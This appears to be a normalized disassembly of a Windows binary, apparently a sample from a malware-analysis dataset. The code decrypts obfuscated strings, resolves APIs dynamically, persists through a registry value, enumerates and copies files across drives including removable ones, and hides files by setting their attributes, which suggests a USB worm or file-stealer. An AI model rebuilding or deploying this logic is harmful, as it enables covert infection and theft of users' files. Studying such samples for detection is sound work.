sub_401000
push ebp
mov ebp esp
push 0xffffffff
push sub_40bfb0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] esp
call sub_401090
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov eax 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x10
call sub_401940
sub_401060
push esi
mov esi [ esp + 0xc ]
xor eax eax
test esi esi
jle r-xdata
pop esi
retn
mov ecx [ esp + 0x8 ]
mov dl [ eax + ecx ]
sub dl al
xor dl 0x13
sub dl 0x17
mov [ eax + ecx ] dl
inc eax
cmp eax esi
jl r-xdata
sub_401090
sub esp 0x104
push ebx
push ebp
push esi
push edi
push 0x8007
call [ SetErrorMode@IAT ]
push 0xd
push rw-data
call sub_401060
push 0x7
push rw-data
call sub_401060
push 0x11
push rw-data
call sub_401060
push 0x10
push rw-data
call sub_401060
push 0x9
push rw-data
call sub_401060
push 0x4
push rw-data
call sub_401060
push 0x9
push rw-data
call sub_401060
push 0xc
push rw-data
call sub_401060
add esp 0x40
push 0x11
push rw-data
call sub_401060
push 0x2c
push rw-data
call sub_401060
push 0x19
push rw-data
call sub_401060
push 0x2d
push rw-data
call sub_401060
push 0x10
push rw-data
call sub_401060
push 0xb
push rw-data
call sub_401060
push 0xe
push rw-data
call sub_401060
push 0x11
push rw-data
call sub_401060
add esp 0x40
push 0x13
push rw-data
call sub_401060
push 0x17
push rw-data
call sub_401060
push 0xb
push rw-data
call sub_401060
push 0x3
push rw-data
call sub_401060
push 0x8
push rw-data
call sub_401060
push 0x16
push rw-data
call sub_401060
push 0xc
push rw-data
call sub_401060
push 0x8
push rw-data
call sub_401060
add esp 0x40
push 0x5
push rw-data
call sub_401060
push 0xb
push rw-data
call sub_401060
push 0xc
push rw-data
call sub_401060
push 0xd
push rw-data
call sub_401060
push 0x11
push rw-data
call sub_401060
add esp 0x28
mov esi rw-data
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push esi
call sub_401060
add esi 0x10
add esp 0x8
cmp esi rw-data
jl r-xdata
mov ebx [ LoadLibraryA@IAT ]
push rw-data
call ebx
mov edi [ GetProcAddress@IAT ]
mov esi eax
push rw-data
push esi
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
mov ebp [ FreeLibrary@IAT ]
push esi
mov [ rw-data ] eax
call ebp
push rw-data
call ebx
mov esi eax
test esi esi
jne r-xdata
push rw-data
push esi
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push esi
mov [ rw-data ] eax
call ebp
push 0x100
push rw-data
call [ GetWindowsDirectoryA@IAT ]
call sub_405cc0
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
lea eax [ esp + 0x14 ]
push 0x100
push eax
call [ GetSystemDirectoryA@IAT ]
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
push rw-data
[ edi ]
not ecx
sub edi ecx
push rw-data
mov edx ecx
mov esi edi
mov edi rw-data
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push rw-data
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x24 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x24 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ sprintf@IAT ]
call esi
push rw-data
push rw-data
push rw-data
push rw-data
push rw-data
call esi
push rw-data
push rw-data
push rw-data
push rw-data
push rw-data
call esi
add esp 0x38
push rw-data
call [ DeleteFileA@IAT ]
push rw-data
call sub_403740
push rw-data
call sub_403740
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push 0x1
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call sub_401b90
mov esi [ CreateEventA@IAT ]
add esp 0xc
push rw-data
push 0x0
push 0x0
push 0x0
call esi
push rw-data
push 0x0
push 0x0
push 0x0
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_401490
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
push 0x0
call sub_4014b0
add esp 0x4
call sub_401650
lea eax [ esp + 0x10 ]
push eax
push 0x0
push 0x0
push sub_403350
push 0x0
push 0x0
call [ CreateThread@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x104
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
sub_4014b0
sub esp 0x288
push esi
xor esi esi
lea eax [ esp + 0x4 ]
push esi
push eax
push esi
push 0x2001f
push esi
push rw-data
push esi
push rw-data
push 0x80000002
mov [ esp + 0x2c ] 0x80
call [ RegCreateKeyExA@IAT ]
mov eax [ esp + 0x4 ]
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0xc ]
push ecx
push edx
push esi
push esi
push rw-data
push eax
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push edi
lea ecx [ esp + 0x90 ]
push 0x200
push ecx
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x90 ]
push 0x5c
push edx
call [ strrchr@IAT ]
mov edx eax
add esp 0x8
inc edx
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov cl [ edx ]
xor edi edi
test cl cl
je r-xdata
mov al [ esp + 0xc ]
test al al
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
lea edx [ esp + 0x10 ]
push ecx
push edx
push 0x1
push 0x0
push rw-data
push eax
mov [ esp + edi + 0x28 ] 0x0
call [ RegSetValueExA@IAT ]
pop edi
lea esi [ esp + 0x10 ]
mov eax edx
sub esi edx
mov eax [ esp + 0x290 ]
mov [ esi + rw-data ] 0x0
test eax eax
je r-xdata
dec al
mov [ esi + rw-data ] al
mov al [ esp + esi + 0xd ]
inc esi
test al al
jne r-xdata
inc cl
inc edi
mov [ esi + eax ] cl
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
pop esi
add esp 0x288
retn
sub_4015d0
push ecx
lea eax [ esp ]
push 0x0
push eax
push 0x0
push 0x2001f
push 0x0
push rw-data
push 0x0
push rw-data
push 0x80000002
call [ RegCreateKeyExA@IAT ]
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp ]
push edx
push eax
call [ RegDeleteValueA@IAT ]
mov edx [ esp + 0x8 ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
mov ecx [ esp + 0x8 ]
push edx
push 0x1
push eax
push edx
push ecx
call [ RegSetValueExA@IAT ]
pop edi
jmp r-xdata
pop ecx
retn
push eax
call [ RegCloseKey@IAT ]
mov eax [ esp ]
test eax eax
je r-xdata
sub_401650
sub esp 0x710
push rw-data
push 0x0
push 0x1f0001
call [ OpenMutexA@IAT ]
test eax eax
je r-xdata
push rw-data
push 0x0
push 0x0
call [ rw-data ]
push ebx
push ebp
push esi
push edi
push 0x1
lea edx [ esp + 0x24 ]
push 0x25
push edx
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x20 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x24 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov ebx [ SetFileAttributesA@IAT ]
and ecx 0x3
lea eax [ esp + 0x24 ]
[ edi ] [ esi ]
push eax
call ebx
mov ebp [ DeleteFileA@IAT ]
lea ecx [ esp + 0x20 ]
push ecx
call ebp
lea edx [ esp + 0x320 ]
push 0x400
push edx
push 0x0
call [ GetModuleFileNameA@IAT ]
mov [ esp + eax + 0x320 ] 0x0
push 0x1
lea eax [ esp + 0x24 ]
push 0x25
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x20 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x20 ]
and ecx 0x3
push 0x2e
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x24 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov esi [ strrchr@IAT ]
call esi
lea ecx [ esp + 0x328 ]
push 0x2e
push ecx
mov [ eax ] 0x0
call esi
add esp 0x10
mov [ eax ] 0x0
lea edx [ esp + 0x20 ]
lea eax [ esp + 0x320 ]
push edx
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
mov ecx [ rw-data ]
push 0x1388
push ecx
call [ WaitForSingleObject@IAT ]
push 0x1f4
call [ Sleep@IAT ]
push 0x0
push rw-data
call sub_4015d0
add esp 0x8
push 0x1
push rw-data
call sub_4015d0
push 0x1
call sub_4014b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x710
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x320 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x24 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call ebx
movsx ecx [ esp + 0x320 ]
push ecx
lea edx [ esp + 0x14 ]
push rw-data
push edx
call [ sprintf@IAT ]
lea eax [ esp + 0x2c ]
lea ecx [ esp + 0x32c ]
push eax
push ecx
call [ rename@IAT ]
add esp 0x14
lea edx [ esp + 0x10 ]
push edx
call ebp
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x220 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x220 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x224 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call ebx
lea ecx [ esp + 0x220 ]
push ecx
call ebp
lea edx [ esp + 0x220 ]
push edx
lea eax [ esp + 0x24 ]
push eax
call [ rename@IAT ]
lea ecx [ esp + 0x28 ]
push ecx
call sub_4025b0
add esp 0xc
push 0x1
call [ ExitProcess@IAT ]
sub_401940
push ecx
push esi
call sub_405d70
test eax eax
je r-xdata
mov esi [ CreateThread@IAT ]
lea eax [ esp + 0x4 ]
push eax
push 0x0
push 0x0
push sub_401ae0
push 0x0
push 0x0
call esi
lea ecx [ esp + 0x4 ]
push ecx
push 0x0
push 0x0
push sub_4019a0
push 0x0
push 0x0
call esi
mov esi [ Sleep@IAT ]
call sub_402760
call sub_401b00
push 0x3e8
call esi
jmp r-xdata
sub_4019a0
sub esp 0x30c
push ebx
push ebp
push esi
push edi
push 0x14
call [ Sleep@IAT ]
jmp r-xdata
mov al [ esp + 0x11c ]
test al al
je r-xdata
lea eax [ esp + 0x11c ]
mov [ esp + 0x10 ] 0x0
push eax
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
xor eax eax
mov esi [ toupper@IAT ]
lea ebx [ esp + ecx + 0x11c ]
or ecx 0xffffffff
mov edi ebx
[ edi ]
movsx edx [ ebx ]
not ecx
dec ecx
push edx
mov ebp ecx
inc ebp
call esi
add esp 0x4
push ebx
call [ GetDriveTypeA@IAT ]
mov edi eax
movsx eax [ ebx ]
push eax
call esi
add esp 0x4
cmp eax 0x43
jl r-xdata
mov eax [ esp + 0x10 ]
add eax ebp
mov ecx eax
mov [ esp + 0x10 ] eax
mov al [ esp + ecx + 0x11c ]
test al al
jne r-xdata
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
push 0x0
push ebx
call [ GetDiskFreeSpaceExA@IAT ]
cmp edi 0x2
je r-xdata
cmp [ esp + 0x18 ] 0x2
jb r-xdata
cmp edi 0x3
jne r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x1c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x1c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x1c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ PathFileExistsA@IAT ]
test eax eax
jne r-xdata
ja r-xdata
push ebx
call sub_401ce0
add esp 0x4
cmp [ esp + 0x14 ] 0x540be400
ja r-xdata
sub_401b00
sub esp 0x200
push ebp
xor ebp ebp
push ebp
call sub_401b90
add esp 0x4
lea eax [ esp + 0x4 ]
push eax
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
pop ebp
add esp 0x200
retn
mov al [ esp + 0x4 ]
test al al
je r-xdata
push ebx
push esi
push edi
lea ebx [ esp + 0x10 ]
add ebp esi
mov al [ esp + ebp + 0x10 ]
lea ebx [ esp + ebp + 0x10 ]
test al al
jne r-xdata
push eax
call sub_401cb0
add esp 0x4
test eax eax
je r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov esi ecx
movsx ecx [ ebx ]
push ecx
inc esi
call [ toupper@IAT ]
add esp 0x4
cmp eax 0x43
jl r-xdata
pop edi
pop esi
pop ebx
push ebx
call sub_401ce0
add esp 0x4
sub_401b90
mov eax [ esp + 0x4 ]
sub esp 0x208
push ebx
xor ebx ebx
test eax eax
push edi
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
mov ecx 0x18
xor eax eax
mov edi rw-data
[ edi ]
mov eax [ esp + 0x214 ]
xor ecx ecx
pop edi
cmp eax ecx
pop ebx
jne r-xdata
mov al [ esp + 0x10 ]
test al al
je r-xdata
add esp 0x208
retn
xor eax eax
push ebp
push esi
lea esi [ esp + 0x18 ]
add eax 0x4
cmp eax 0x60
jl r-xdata
cmp [ eax + rw-data ] ecx
jne r-xdata
add ebx ebp
mov al [ esp + ebx + 0x18 ]
lea esi [ esp + ebx + 0x18 ]
test al al
jne r-xdata
push esi
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
je r-xdata
cmp [ eax + rw-data ] ecx
je r-xdata
mov [ eax + rw-data ] ecx
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov ebp ecx
movsx ecx [ esi ]
push ecx
inc ebp
call [ toupper@IAT ]
mov edi eax
add esp 0x4
cmp edi 0x43
jl r-xdata
pop esi
pop ebp
mov eax [ esp + 0x21c ]
test eax eax
jne r-xdata
cmp eax 0x3
jne r-xdata
lea edx [ esp + 0x10 ]
push 0x0
push edx
push 0x0
push esi
mov [ edi * 4 + rw-data ] edi
call [ GetDiskFreeSpaceExA@IAT ]
cmp [ esp + 0x14 ] 0x2
ja r-xdata
mov [ edi * 4 + rw-data ] edi
jmp r-xdata
jb r-xdata
mov [ edi * 4 + rw-data ] 0x0
cmp [ esp + 0x10 ] 0x540be400
jae r-xdata
sub_401cb0
mov eax [ esp + 0x4 ]
mov edx [ eax * 4 + rw-data ]
lea ecx [ eax * 4 + rw-data ]
test edx edx
jne r-xdata
xor eax eax
retn
mov edx [ eax * 4 + rw-data ]
test edx edx
je r-xdata
mov [ ecx ] eax
mov eax 0x1
retn
sub_401ce0
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
push esi
mov esi [ esp + 0x8 ]
push 0x5c
push esi
mov [ rw-data ] 0x1
call [ strrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
push esi
call sub_401d30
push esi
call sub_401f90
add esp 0x8
mov [ rw-data ] 0x0
pop esi
mov [ eax ] 0x0
sub_401d30
sub esp 0x840
lea eax [ esp + 0x240 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x850 ]
push edi
mov edi [ sprintf@IAT ]
push rw-data
push rw-data
push rw-data
push esi
push rw-data
push eax
call edi
push rw-data
push rw-data
push esi
lea ecx [ esp + 0x474 ]
push rw-data
push ecx
call edi
push rw-data
push rw-data
push esi
lea edx [ esp + 0x688 ]
push rw-data
push edx
call edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x40
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x50 ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x50 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
mov ebp [ CopyFileA@IAT ]
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x54 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x258 ]
push ecx
call ebp
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x50 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
lea edx [ esp + 0x50 ]
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x54 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x458 ]
push ecx
call ebp
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x840
retn
lea edx [ esp + 0x50 ]
push rw-data
push edx
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push esi
push 0x40
lea eax [ esp + 0x18 ]
push 0x1
push eax
call [ fread@IAT ]
push esi
mov [ esp + eax + 0x24 ] 0x0
call [ fclose@IAT ]
add esp 0x14
mov esi rw-data
lea eax [ esp + 0x10 ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x50 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x50 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x54 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x658 ]
push ecx
call ebp
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
lea edx [ esp + 0x50 ]
push edx
call sub_4025b0
add esp 0x4
push 0x7d0
call [ Sleep@IAT ]
lea eax [ esp + 0x50 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
lea ecx [ esp + 0x50 ]
push ecx
call [ DeleteFileA@IAT ]
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_401f90
sub esp 0x400
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push ebx
push esi
push edi
mov edi [ esp + 0x410 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
lea edx [ esp + 0xc ]
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x20c ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0xc ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x20c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0xc ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_403740
lea ecx [ esp + 0x210 ]
push rw-data
push ecx
call [ fopen@IAT ]
mov esi eax
add esp 0xc
test esi esi
je r-xdata
lea edx [ esp + 0x20c ]
push edx
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
lea eax [ esp + 0x210 ]
push eax
call [ SetFileAttributesA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0xc ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0xc ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_403740
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
call sub_402140
add esp 0xc
pop edi
pop esi
pop ebx
add esp 0x400
retn
mov edi [ fwrite@IAT ]
push esi
push 0x1
push 0x11
push rw-data
call edi
push esi
push 0x1
push 0x2
push rw-data
call edi
push esi
push 0x1
push 0x2c
push rw-data
call edi
push esi
call [ fclose@IAT ]
add esp 0x34
sub_402140
sub esp 0x94c
mov eax [ esp + 0x950 ]
push ebx
mov ebx [ sprintf@IAT ]
push ebp
push esi
push edi
push eax
lea ecx [ esp + 0x760 ]
push rw-data
push ecx
call ebx
add esp 0xc
lea edx [ esp + 0x1c ]
lea eax [ esp + 0x75c ]
push edx
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x94c
retn
mov ebp [ esp + 0x964 ]
mov esi [ esp + 0x10 ]
lea eax [ esp + 0x1c ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea edi [ esp + 0x48 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x25c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ esp + 0x960 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ esp + 0x55c ]
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x25c ]
push ecx
push edx
push rw-data
push eax
call ebx
lea ecx [ esp + 0x26c ]
lea edx [ esp + 0x36c ]
push ecx
push ebp
push rw-data
push edx
call ebx
mov al [ esp + 0x3c ]
add esp 0x20
test al 0x10
je r-xdata
push esi
call [ FindClose@IAT ]
jmp r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x15c ]
[ edi ]
not ecx
sub edi ecx
push 0x5c
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x160 ]
push ecx
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
lea eax [ esp + 0x35c ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea ecx [ esp + 0x35c ]
lea edx [ esp + 0x55c ]
push ecx
push edx
call sub_402140
add esp 0x8
test eax eax
je r-xdata
cmp [ esp + 0x48 ] 0x2e
je r-xdata
push 0x0
lea edx [ esp + 0x18 ]
push 0x0
lea eax [ esp + 0x164 ]
push edx
push eax
call [ GetDiskFreeSpaceExA@IAT ]
mov eax [ esp + 0x18 ]
test eax eax
ja r-xdata
mov [ eax + 0x1 ] 0x0
mov ecx [ esp + 0x10 ]
push ecx
call [ FindClose@IAT ]
jmp r-xdata
lea ecx [ esp + 0x35c ]
push 0x0
lea edx [ esp + 0x560 ]
push ecx
push edx
call [ CopyFileA@IAT ]
cmp [ esp + 0x14 ] 0x4c4b40
jb r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x94c
retn
sub_402310
push esi
push rw-data
call sub_403740
mov esi [ esp + 0xc ]
push 0x5c
push esi
call [ strrchr@IAT ]
add esp 0xc
test eax eax
je r-xdata
push esi
call sub_402340
add esp 0x4
pop esi
retn
mov [ eax ] 0x0
sub_402340
sub esp 0xa64
mov eax [ esp + 0xa68 ]
push ebx
push ebp
mov ebp [ sprintf@IAT ]
push esi
push edi
push eax
lea ecx [ esp + 0x478 ]
push rw-data
push ecx
call ebp
add esp 0xc
lea edx [ esp + 0x34 ]
lea eax [ esp + 0x474 ]
push edx
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
push rw-data
call sub_403770
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0xa64
retn
mov ebx [ FileTimeToSystemTime@IAT ]
mov al [ rw-data ]
test al 0x1
jne r-xdata
lea edi [ esp + 0x60 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x174 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ esp + 0xa78 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ esp + 0x274 ]
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x174 ]
push ecx
push edx
push rw-data
push eax
call ebp
mov al [ esp + 0x44 ]
add esp 0x10
test al 0x10
je r-xdata
call [ GetTickCount@IAT ]
mov esi [ rw-data ]
mov ecx eax
sub ecx esi
cmp ecx 0x64
jbe r-xdata
or al 0x1
mov [ rw-data ] al
call [ GetTickCount@IAT ]
mov [ rw-data ] eax
mov eax [ esp + 0x54 ]
mov esi eax
shr esi 0xa
test eax 0x3ff
je r-xdata
push 0x64
call [ Sleep@IAT ]
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x38 ]
push ecx
push edx
call ebx
mov eax [ esp + 0x1e ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x1a ]
and eax 0xffff
and ecx 0xffff
push eax
mov eax [ esp + 0x1a ]
push ecx
mov ecx [ esp + 0x1c ]
and edx 0xffff
and eax 0xffff
push edx
